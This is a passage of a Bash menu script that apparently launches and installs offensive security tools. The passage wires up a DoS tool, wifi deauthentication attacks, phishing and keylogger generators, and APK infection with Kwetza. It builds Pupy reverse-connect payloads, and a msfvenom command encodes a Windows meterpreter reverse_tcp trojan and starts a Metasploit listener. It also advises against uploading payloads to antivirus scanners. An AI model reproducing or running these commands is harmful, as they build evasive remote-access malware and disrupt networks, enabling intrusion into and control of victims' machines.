			if [[ "$INSTALL" = "install" ]]
			then
				install_zatacker
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "5" ]]
	then
		if [[ -d /root/morpheus ]]
		then
			cd /root/morpheus
			./morpheus.sh
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_morpheus
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "7" ]]
	then
		if [[ -d /root/hakkuframework ]]
		then
			echo -e "type: 'show modules' to start"
			sleep 2
			clear
			cd /root/hakkuframework
			./hakku
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_hakku
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "8" ]]
	then
		if [[ -d /root/Trity ]]
		then
			echo -e "type: 'help' to start"
			sleep 2
			clear
			trity			
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_trity
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "9" ]]
	then
		if [[ -d "/root/Dracnmap" ]]
		then
			cd /root/Dracnmap/
			./dracnmap-v*.sh	
			cd		
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_dracnmap
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "10" ]]
	then
		if [[ -d "/usr/share/fern-wifi-cracker" ]]
		then
			cd /root/Fern-Wifi-Cracker
			python execute.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_fern
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "11" ]]
	then
		if [[ -f /usr/sbin/netdiscover ]]
		then
			echo -e "Range ("$YS"Enter"$CE"=192.168.1.0/24):"
			read NRANGE
			if [[ -z $NRANGE ]]
			then
				NRANGE="192.168.1.0/24"
			fi
			netdiscover -r $NRANGE
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_netdiscover
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "12" ]]
	then
		if [[ -d "/root/kickthemout" ]]
		then
			cd /root/kickthemout
			python kickthemout.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_kickthemout
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "13" ]]
	then
		if [[ -d "/usr/share/ghost-phisher" ]]
		then	
			cd /root/ghost-phisher/Ghost-Phisher
			python ghost.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_ghostphisher
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "14" ]]
	then
		if [[ -d "/root/The-Eye" ]]
		then
			cd /root/The-Eye
			./TheEye
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_theeye
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "15" ]]
	then
		if [[ -d "/root/xerxes" ]]
		then
			echo -e "Do you own the site you want to DoS?"$YNONLY""
			read DOSTERM
			if [[ "$DOSTERM" = "y" ]]
			then

				clear
				echo -e "Enter your site(e.g: iownthissite.com): "
				echo -e "(without www)"
				read -e SITEDOS
				clear
				echo -e "Launching www.isitdownrightnow.com for $SITEDOS"
				sleep 4
				xdg-open http://www.isitdownrightnow.com/"$SITEDOS".html
				clear	
				cd /root/xerxes
				SITEDOSX=www.$SITEDOS
				echo -e "Press "$YS"any key"$CE" to start DoS on $SITEDOSX"
				$READAK
				./xerxes $SITEDOSX 80
			else
				clear
				echo -e "Then never try this."
				sleep 3
				exec bash "$0"
			fi
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_xerxes
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "16" ]]
	then
		if [[ -d /root/mdk3-master ]]
		then
			echo -e "Press "$YS"CTRL C"$CE" when you find your target AP"
			echo -e "Press "$YS"any key"$CE" to start scanning."
			$READAK
			airodump-ng $WLANNM
			echo -e "Enter your target's BSSID: "
			read -e MDBSSID
			echo -e "Enter your target's channel: "
			read -e MDCHANN
			echo -e "Enter frames per second(e.g: 50): "
			read -e FPS
			clear
			xterm -e 'mdk3 $WLANNM t $MDCHANN $MDBSSID $FPS'	
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_mdk3
			else
				continue
			fi
		fi	
	elif [[ "$APPP" = "17" ]]
	then	
		if [[ -d /root/mdk3-master ]]
		then
			echo -e "Press "$YS"any key"$CE" to start scanning with wash."
			$READAK
			gnome-terminal -e 'wash -i $WLANNM'
			echo -e "Enter your target's BSSID: "
			read -e MDBSSID
			echo -e "Enter your target's ESSID: "
			read -e MDESSID
			#~ echo -e "Enter your target's channel: "
			#~ read -e MDCHANN
			echo -e "Enter frames per second(e.g: 50): "
			read -e FPS
			clear
			xterm -e 'mdk3 $WLANNM x 0 -t $MDBSSID -n $MDESSID -s $FPS'		
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_mdk3
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "18" ]]
	then
		if [[ -d "/usr/share/KatanaFramework" ]]
		then
			ktf.console
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_katana
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "19" ]]
	then
		if [[ -d "/root/airgeddon" ]]
		then
			cd /root/airgeddon
			./airgeddon.sh
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_airgeddon
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "20" ]]
	then
		if [[ -d "/usr/share/websploit" ]]
		then
			websploit
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_websploit
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "21" ]]
	then
		if [[ -d /etc/openvas ]]
		then
			echo -e "Start or stop?("$YS"start"$CE"/"$YS"stop"$CE")"
			read -e SORS
			if [[ "$SORS" == "start" ]]
			then
				netstat -nltp
				openvas-start
				echo -e "Launching firefox..."
				sleep 1
				firefox https://127.0.0.1:9392
			else
				openvas-stop
			fi
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_openvas
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "22" ]]
	then
		if [[ -d "/usr/lib/ipscan" ]]
		then
			bash /usr/bin/ipscan & disown
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_angryip
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "23" ]]
	then
		if [[ -d "/root/routersploit" ]]
		then
			cd /root/routersploit
			./rsf.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_routersploit
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "24" ]]
	then
		if [[ -d "/root/nWatch" ]]
		then
			cd /root/nWatch
			python nwatch.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_nwatch
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "25" ]]
	then
		if [[ -d "/root/eternal_scanner" ]]
		then
			cd /root/eternal_scanner
			./escan
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_eternalscanner
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "26" ]]
	then
		if [[ -d "/root/eaphammer" ]]
		then
			eaphammer_automation
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_eaphammer
			else
				continue
			fi
		fi
		cd
	elif [[ "$APPP" = "6" ]]
	then
		if [[ -d "/root/hakkuframework" ]]
		then
			while true
			do
			printf '\033]2;OSRFCONSOLE\a'
			clear
			echo -e ""$YS" 1"$CE") usufy"
			echo -e ""$YS" 2"$CE") mailfy"
			echo -e ""$YS" 3"$CE") searchfy"
			echo -e ""$YS" 4"$CE") domainfy"
			echo -e ""$YS" 5"$CE") phonefy"
			echo -e ""$YS" 6"$CE") entify"
			echo -e ""$YS" b"$CE") Go back"
			echo -e ""$YS"00"$CE") Main menu"
		#	echo -e ""$YS" 0"$CE") EXIT"
			echo -e "Choose: "
			read -e OSFR
			clear
				if [[ "$OSFR" = "1" ]]
				then
					echo -e "Use: usufy.py -n name1 name2 -p twitter facebook"
					usufy.py
					exit
				elif [[ "$OSFR" = "2" ]]
				then
					echo -e "Use: mailfy.py -n name1"
					mailfy.py
					exit
				elif [[ "$OSFR" = "3" ]]
				then
					searchfy.py
					exit
				elif [[ "$OSFR" = "4" ]]
				then
					domainfy.py
					exit
				elif [[ "$OSFR" = "5" ]]
				then
					phonefy.py
					exit
				elif [[ "$OSFR" = "6" ]]
				then
				entify.py
					exit
				elif [[ "$OSFR" = "0" ]]
				then
					exit
				elif [[ "$OSFR" = "00" ]]
				then
					exec bash "$0"
				elif [[ "$OSFR" = "back" || "$OSFR" = "b" ]]
				then
					break
				else 
					echo -e "Wrong choice"
					sleep 0.3
					clear
					exec bash "$0"
				fi
			done
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_hakku
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "0" ]]
	then
		clear
		exit
	elif [[ "$APPP" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$APPP" = "back" || "$APPP" = "b" ]]
	then
		break
	fi
	if [[ "$APPP" != "" ]]
	then
		echo -e "$PAKTGB"
		$READAK
	fi
	done
}
function remote_access
{
	while true 
	do
	clear
	TERMINALTITLE="REMOTE ACCESS"
	dash_calc
	printf '\033]2;REMOTE ACCESS\a'
	if [[ -d /root/BeeLogger ]]
	then
		echo -e ""$YS" 1"$CE") BeeLogger    Generate keylogger"
	else
		echo -e ""$RS" 1"$CE") "$RS"BeeLogger"$CE"    Generate keylogger"
	fi
	if [[ -d /root/ezsploit ]]
	then
		echo -e ""$YS" 2"$CE") Ezsploit     Generate payloads for many platforms,listeners etc..."
	else
		echo -e ""$RS" 2"$CE") "$RS"Ezsploit"$CE"     Generate payloads for many platforms,listeners etc..."
	fi
	if [[ -d /root/pupy ]]
	then
		echo -e ""$YS" 3"$CE") Pupy         Generate payloads for many platforms,listeners etc..."
	else
		echo -e ""$RS" 3"$CE") "$RS"Pupy"$CE"         Generate payloads for many platforms,listeners etc..."
	fi
	if [[ -d /root/zirikatu ]]
	then
		echo -e ""$YS" 4"$CE") Zirikatu     Generate undetectable payloads"
	else
		echo -e ""$RS" 4"$CE") "$RS"Zirikatu"$CE"     Generate undetectable payloads"
	fi
	if [[ -d /root/TheFatRat ]]
	then
		echo -e ""$YS" 5"$CE") TheFatRat    Generate undetectable payloads"
	else
		echo -e ""$RS" 5"$CE") "$RS"TheFatRat"$CE"    Generate undetectable payloads"
	fi
	if [[ -d /root/Winpayloads ]]
	then
		echo -e ""$YS" 6"$CE") Winpayloads  Generate undetectable payloads"
	else
		echo -e ""$RS" 6"$CE") "$RS"Winpayloads"$CE"  Generate undetectable payloads"
	fi
	if [[ -f /usr/bin/shellter ]]
	then
		echo -e ""$YS" 7"$CE") Shellter     Inject payload into .exe"
	else
		echo -e ""$RS" 7"$CE") "$RS"Shellter"$CE"     Inject payload into .exe"
	fi
	if [[ -d /root/CHAOS ]]
	then
		echo -e ""$YS" 8"$CE") CHAOS        Generate payloads/listeners"
	else
		echo -e ""$RS" 8"$CE") "$RS"CHAOS"$CE"        Generate payloads/listeners"
	fi
	if [[ -d /root/kwetza ]]
	then
		echo -e ""$YS" 9"$CE") Kwetza        Inject payload to apk"
	else
		echo -e ""$RS" 9"$CE") "$RS"Kwetza"$CE"        Inject payload to apk"
	fi
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS"00"$CE") Main menu"
	#echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e KEYLOG
	clear
	if [[ "$KEYLOG" = "1" ]]
	then
		if [[ -d /root/BeeLogger ]]
		then
			cd /root/BeeLogger
			python bee.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_beelogger
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "8" ]]
	then
		if [[ -d /root/CHAOS ]]
		then
			cd /root/CHAOS
			go run CHAOS.go
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_chaos
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "9" ]]
	then
		if [[ -d /root/kwetza ]]
		then
			cd /root/kwetza
			printf '\033]2;KWETZA\a'
			while true
			do
				clear
				if [[ "$APK" = "" ]]
				then
					APK="\e[1;31mNONE\e[m"
				fi
				if [[ "$APKLH" = "" ]]
				then
					APKLH="\e[1;31mNONE\e[m"
				fi
				if [[ "$APKLP" = "" ]]
				then
					APKLP="\e[1;31mNONE\e[m"
				fi
				if [[ "$APKPROT" = "" ]]
				then
					APKPROT="tcp"
				fi
				if [[ "$APKPERM" = "" ]]
				then
					APKPERM="yes"
				fi
				echo -e ""$YS" 1"$CE") Apk to infect                      CURRENT:$APK"
				echo -e ""$YS" 2"$CE") LHOST                              CURRENT:$APKLH"
				echo -e ""$YS" 3"$CE") LPORT                              CURRENT:$APKLP"
				echo -e ""$YS" 4"$CE") Protocol                           CURRENT:$APKPROT"
				echo -e ""$YS" 5"$CE") Add additional permissions         CURRENT:$APKPERM"
				echo -e ""$YS" b"$CE") Go back"
				echo -e ""$YS" run"$CE") Infect apk"
				echo -e "Choose: "
				read APKK
				clear
				if [[ "$APKK" = 1 ]]
				then
					echo -e "Apk to infect(must be in /root/kwetza): "
					read APKTBI
					if [[ -f "$APKTBI" ]]
					then
						APK="$APKTBI"
					else
						echo -e ""$RS"/root/kwetza/"$APKTBI" not found"$CE""
						sleep 3
					fi
				elif [[ "$APKK" = 2 ]]
				then
					echo -e "LHOST: "
					read APKLH
				elif [[ "$APKK" = 3 ]]
				then
					echo -e "LPORT: "
					read APKLP
				elif [[ "$APKK" = 4 ]]
				then
					if [[ "$APKPROT" = "tcp" ]]
					then
						APKPROT="https"
					else
						APKPROT="tcp"
					fi
				elif [[ "$APKK" = 5 ]]
				then
					if [[ "$APKPERM" = "yes" ]]
					then
						APKPERM="no"
					else
						APKPERM="yes"
					fi
				elif [[ "$APKK" = "back" || "$APKK" = "b" ]]
				then
					break
				elif [[ "$APKK" = "run" ]]
				then
					if [[ "$APK" = "\e[1;31mNONE\e[m" ]]
					then
						echo -e ""$RS"No apk specified."$CE""
						sleep 3
						continue
					fi
					if [[ "$APKLH" = "\e[1;31mNONE\e[m" ]]
					then
						echo -e ""$RS"No LHOST specified."$CE""
						sleep 3
						continue
					fi
					if [[ "$APKLP" = "\e[1;31mNONE\e[m" ]]
					then
						echo -e ""$RS"No LPORT specified."$CE""
						sleep 3
						continue
					fi
					cd /root/kwetza
					python kwetza.py $APK $APKLH $APKPROT $APKLP $APKPERM
					echo -e "$PAKTGB"
					$READAK
				fi
			done
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_kwetza
			else
				continue
			fi
		fi	
	elif [[ "$KEYLOG" = "7" ]]
	then
		if [[ -f /usr/bin/shellter ]]
		then
			shellter
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_shellter
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "2" ]]
	then
		if [[ -d /root/ezsploit ]]
		then
			cd /root/ezsploit/
			./ezsploit.sh
			cd
			echo -e "Go to metasploit menu to create a listener(Option "$YS"14"$CE")"
			sleep 2
			echo -e "Press "$YS"any key"$CE" to leave..."
			$READAK
			exec bash "$0"
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_ezsploit
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "3" ]]
	then
		if [[ -d /root/pupy ]]
		then
			while true
			do
			clear
			echo -e ""$YS" 1"$CE") Generate a payload"
			echo -e ""$YS" 2"$CE") Start listener"
			echo -e ""$YS" b"$CE") Go back"
			echo -e ""$YS"00"$CE") Main menu"
			echo -e ""$YS" 0"$CE") EXIT"
			read -e PUPY
			if [[ "$PUPY" = "1" ]]
			then
				clear
				echo -e "Choose the target OS:"
				echo -e ""$YS" 1"$CE") Windows"
				echo -e ""$YS" 2"$CE") Linux"
				echo -e ""$YS" 3"$CE") Android"
				echo -e "Choose: "
				read -e TAROS
				if [[ "$TAROS" = "1" ]]
				then
					TAROS="windows"
				elif [[ "$TAROS" = "2" ]]
				then
					TAROS="linux"
				elif [[ "$TAROS" = "3" ]]
				then
					TAROS="android"
				else
					echo -e "Wrong choice.Returning to main manu..."
					sleep 2
					exec bash "$0"
				fi
				clear
				echo -e "Enter your ip: "
				read -e PUPYIP
				clear
				echo -e "Enter your port(e.g: 443): "
				read -e PUPYPORT
				clear
				echo -e "Enter the full output path(e.g: /root/Desktop/payload1.exe)"
				read -e PUPYPATH
				cd /root/pupy/pupy
				./pupygen.py -O $TAROS -o "$PUPYPATH" connect --host "$PUPYIP":"$PUPYPORT"
				cd
			elif [[ "$PUPY" = "2" ]]
			then
				cd /root/pupy/pupy
				./pupysh.py
			elif [[ "$PUPY" = "00" ]]
			then
				exec bash "$0"
			elif [[ "$PUPY" = "back" || "$PUPY" = "b" ]]
			then
				break
			elif [[ "$PUPY" = "0" ]]
			then
				exit
			fi
			done
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_pupy
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "4" ]]
	then
		if [[ -d /root/zirikatu ]]
		then
			clear
			echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
			sleep 3
			echo -e "You agree with that?("$YS"YES"$CE"/"$YS"*"$CE")"
			read MUSTBEYES
			if [[ "$MUSTBEYES" = "YES" ]] 
			then 
				clear
				cd /root/zirikatu
				./zirikatu.sh
				cd
			fi
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_zirikatu
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "5" ]]
	then
		if [[ -d /root/TheFatRat ]]
		then
			fatrat
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_thefatrat
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "6" ]]
	then
		if [[ -d /root/Winpayloads ]]
		then
			cd /root/Winpayloads
			./WinPayloads.py
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_winpayloads
			else
				continue
			fi
		fi
	elif [[ "$KEYLOG" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$KEYLOG" = "0" ]]
	then
		clear
		exit
	elif [[ "$KEYLOG" = "back" || "$KEYLOG" = "b" ]]
	then
		break
	fi
	echo -e "$PAKTGB"
	$READAK
	done
}
function information_gathering
{
	while true 
	do
		clear
		TERMINALTITLE="INFORMATION GATHERING"
		dash_calc
		printf '\033]2;INFORMATION GATHERING\a'
		if [[ -d /usr/share/sniper ]]
		then
			echo -e ""$YS" 1"$CE") Sniper"
		else
			echo -e ""$RS" 1"$CE") "$RS"Sniper"$CE""
		fi
		if [[ -d /root/ReconDog ]]
		then
			echo -e ""$YS" 2"$CE") ReconDog"
		else
			echo -e ""$RS" 2"$CE") "$RS"ReconDog"$CE""
		fi
		if [[ -d /root/RED_HAWK ]]
		then
			echo -e ""$YS" 3"$CE") RED HAWK"
		else
			echo -e ""$RS" 3"$CE") "$RS"RED HAWK"$CE""
		fi
		if [[ -d /root/Infoga ]]
		then
			echo -e ""$YS" 4"$CE") Infoga"
		else
			echo -e ""$RS" 4"$CE") "$RS"Infoga"$CE""
		fi
		if [[ -d /root/KnockMail ]]
		then
			echo -e ""$YS" 5"$CE") KnockMail"
		else
			echo -e ""$RS" 5"$CE") "$RS"KnockMail"$CE""
		fi
		echo -e ""$YS" b"$CE") Go back"
		echo -e ""$YS"00"$CE") Main menu"
		echo -e "Choose: "
		read INFOG
		clear
		if [[ "$INFOG" = 1 ]]
		then
			if [[ -d /usr/share/sniper ]]
			then
				echo -e "Enter the domain you want to scan: "
				read DOMAIN
				clear
				sniper $DOMAIN
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_sniper
				else
					continue
				fi
			fi
		elif [[ "$INFOG" = 2 ]]
		then
			if [[ -d /root/ReconDog ]]
			then
				cd /root/ReconDog
				python dog.py
				cd
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_recondog
				else
					continue
				fi
			fi
		elif [[ "$INFOG" = 3 ]]
		then
			if [[ -d /root/RED_HAWK ]]
			then
				cd /root/RED_HAWK
				php rhawk.php
				cd
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_redhawk
				else
					continue
				fi

			fi
		elif [[ "$INFOG" = 4 ]]
		then
			if [[ -d /root/Infoga ]]
			then
				echo -e "Domain to search:"
				read INFOTARG
				echo -e "Data source(e.g. "$YS"all"$CE","$YS"google"$CE","$YS"bing"$CE","$YS"yahoo"$CE","$YS"pgp"$CE"): "
				read INFOSOUR
				clear
				cd /root/Infoga
				python infoga.py -t $INFOTARG -s $INFOSOUR 
				echo -e "$PAKTGB"
				$READAK
				cd
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_infoga
				else
					continue
				fi

			fi
		elif [[ "$INFOG" = 5 ]]
		then
			if [[ -d /root/KnockMail ]]
			then
				clear
				cd /root/KnockMail
				python2.7 knock.py
				cd
			else
				echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_knockmail
				else
					continue
				fi

			fi
		elif [[ "$INFOG" = 0 ]]
		then
			exit
		elif [[ "$INFOG" = 00 ]]
		then
			exec bash $0
		elif [[ "$INFOG" = "back" || "$INFOG" = "b" ]]
		then
			break
		fi
	done
}
function other_tools
{
while true
do
	printf '\033]2;OTHER TOOLS\a'
	clear
	TERMINALTITLE="OTHER TOOLS"
	dash_calc
	if [[ -f /usr/bin/geany ]]
	then
		echo -e ""$YS" 1"$CE") Geany            Best notepad for linux"
	else
		echo -e ""$RS" 1"$CE") "$RS"Geany"$CE"            Best notepad for linux"
	fi
	if [[ -d /root/dagon ]]
	then
		echo -e ""$YS" 2"$CE") Dagon            Hash cracker/Advanced Hash Manipulation"
	else
		echo -e ""$RS" 2"$CE") "$RS"Dagon"$CE"            Hash cracker/Advanced Hash Manipulation"
	fi
	if [[ -d /root/LALIN ]]
	then
		echo -e ""$YS" 3"$CE") LALIN            Automatically install any package for pentest "
	else
		echo -e ""$RS" 3"$CE") "$RS"LALIN"$CE"            Automatically install any package for pentest "
	fi
	if [[ -d /root/cupp ]]
	then
		echo -e ""$YS" 4"$CE") Cupp             Make specific worldlists"
	else
		echo -e ""$RS" 4"$CE") "$RS"Cupp"$CE"             Make specific worldlists"
	fi
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e OTHERT
	clear
	if [[ "$OTHERT" = 1 ]]
	then
		if [[ -f /usr/bin/geany ]]
		then
			geany
		else
			echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_geany
				else
					continue
				fi

		fi
	elif [[ "$OTHERT" = 2 ]]
	then
		if [[ -d /root/dagon ]]
		then
			dagon_script
		else
			echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_dagon
				else
					continue
				fi

		fi
	elif [[ "$OTHERT" = 3 ]]
	then
		if [[ -d /root/LALIN ]]
		then
			cd /root/LALIN
			./Lalin.sh
			cd
		else
			echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_lalin
				else
					continue
				fi
		fi
	elif [[ "$APPP" = "4" ]]
	then
		if [[ -d "/root/cupp" ]]
		then
			cd /root/cupp
			python cupp.py -i
			cd			
		else
			echo -e "$TNI"
				read INSTALL
				if [[ "$INSTALL" = "install" ]]
				then
					install_cupp
				else
					continue
				fi
		fi
	elif [[ "$OTHERT" = 00 ]]
	then
		clear
		exec bash $0
	elif [[ "$OTHERT" = "back" || "$OTHERT" = "b" ]]
	then
		break
	elif [[ "$OTHERT" = 0 ]]
	then
		clear
		exit
	fi
done
}
function metasploit_menu
{
	if [[ ! -d "$LPATH"/rc ]]
	then
		mkdir "$LPATH"/rc
	fi
	while true
	do
	clear
	TERMINALTITLE="METASPLOIT"
	dash_calc
	printf '\033]2;METASPLOIT\a'
	echo -e ""$YS" 1"$CE") Create payload with msfvenom"
	echo -e ""$YS" 2"$CE") Create listener"
	echo -e ""$YS" 3"$CE") Saved listeners"
	echo -e ""$YS" 4"$CE") Start msfconsole"
	echo -e ""$YS" 5"$CE") Update msfconsole"
	echo -e ""$YS" 6"$CE") Armitage"
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e METASP
	clear
	if [[ "$METASP" = "1" ]]
	then
		PAYLOADL=""
		echo -e "PAYLOAD (Default: "$YS"windows/meterpreter/reverse_tcp"$CE"): "
		read PAYLOADL
		if [[ -z "$PAYLOADL" ]]
		then
			echo -e "Setting PAYLOAD to windows/meterpreter/reverse_tcp"
			sleep 2
			PAYLOADL="windows/meterpreter/reverse_tcp"
		fi
		echo -e "LHOST: "
		read ATIP
		echo -e ""
		echo -e "LPORT: "
		read ATPORT
		echo -e ""
		echo -e "Enter the target's architecture("$YS"x86"$CE"/"$YS"x64"$CE"): "
		read TARCH
		echo -e "Enter the name of the payload(e.g: "$YS"trojan2"$CE"): "
		read ATEXE
		ATEXEPATH="/root/Desktop/$ATEXE.exe"
		clear
		echo -e "Generating"
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		sleep 0.1
		echo .
		if [[ "$TARCH" = "x64" ]]
		then
			msfvenom -p $PAYLOADL --platform windows -a x64 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
		else
			msfvenom -p $PAYLOADL --platform windows -a x86 -f exe -e x86/shikata_ga_nai LHOST="$ATIP" LPORT="$ATPORT" -o "$ATEXEPATH"
		fi
		echo -e "Done."
		echo -e ""
		echo -e "$PAKTC"
		$READAK
		clear
		echo -e "Create a listener for this payload? $YNYES "
		read PAYL
		if [[ "$PAYL" != "n" ]]
		then
			echo -e "Name of listener(e.g: "$YS"john"$CE") : "
			read NAMEL
			echo "use exploit/multi/handler" > "$LPATH"/rc/"$NAMEL".rc
			echo "set PAYLOAD $PAYLOADL " >> "$LPATH"/rc/"$NAMEL".rc
			echo "set LHOST $ATIP " >> "$LPATH"/rc/"$NAMEL".rc
			echo "set LPORT $ATPORT " >> "$LPATH"/rc/"$NAMEL".rc
			echo "set ExitOnSession false" >> "$LPATH"/rc/"$NAMEL".rc
			echo "exploit -j" >> "$LPATH"/rc/"$NAMEL".rc
			clear
			echo -e "Launch the listener now? "$YNONLY""
			read LLN
			if [[ "$LLN" = "y" ]]
			then
				echo -e "Launching msfconsole..."
				sleep 2
				clear
				msfconsole -r "$LPATH"/rc/"$NAMEL".rc
			fi
		fi
	elif [[ "$METASP" = "z" ]]
	then
		clear
		echo -e "CAUTION: DO NOT upload it to anti-virus scanners online."
		sleep 3
		echo -e "You agree with that?("$YS"YES"$CE"/"$YS"*"$CE")"
		read MUSTBEYES
		if [[ "$MUSTBEYES" = "YES" ]] 
		then 
			clear
			cd /root/zirikatu
			./zirikatu.sh
		fi
	elif [[ "$METASP" = "2" ]]
	then
		clear
		echo -e "LHOST: "
		read LHOSTL
		echo -e "LPORT: "
		read LPORTL
		echo -e "PAYLOAD (Default: "$YS"windows/meterpreter/reverse_tcp"$CE"): "
		read PAYLOADL
		if [[ -z "$PAYLOADL" ]]
		then
			echo -e "Setting PAYLOAD to windows/meterpreter/reverse_tcp"
			sleep 2
			PAYLOADL="windows/meterpreter/reverse_tcp"
		fi
		echo -e "Name of listener(e.g: "$YS"john"$CE") : "
		read NAMEL
		echo "use exploit/multi/handler" > "$LPATH"/rc/"$NAMEL".rc
		echo "set PAYLOAD $PAYLOADL " >> "$LPATH"/rc/"$NAMEL".rc
		echo "set LHOST $LHOSTL " >> "$LPATH"/rc/"$NAMEL".rc
		echo "set LPORT $LPORTL " >> "$LPATH"/rc/"$NAMEL".rc
		echo "set ExitOnSession false" >> "$LPATH"/rc/"$NAMEL".rc
		echo "exploit -j" >> "$LPATH"/rc/"$NAMEL".rc
		clear
		echo -e "Launch the listener now? "$YNONLY""
		read LLN
		if [[ "$LLN" = "y" ]]
		then
			echo -e "Launching msfconsole..."
			sleep 2
			clear
			msfconsole -r "$LPATH"/rc/"$NAMEL".rc
		fi
	elif [[ "$METASP" = "3" ]]
	then
		while true
		do
		clear
		ls -w 1 "$LPATH"/rc
		echo -e ""
		echo -e ""
		echo -e "Enter the name of the listener you want to select(e.g: "$YS"john"$CE")"
		echo -e ""$YS"reset"$CE") Delete all saved listeners"
		echo -e ""$YS" back"$CE") Go back"
		read NAMERC
		clear
		if [[ "$NAMERC" = "back" || "$NAMERC" = "b" ]]
		then
			break
		elif [[ "$NAMERC" = "reset" ]]
		then
			rm -f "$LPATH"/rc/*
			continue
		fi
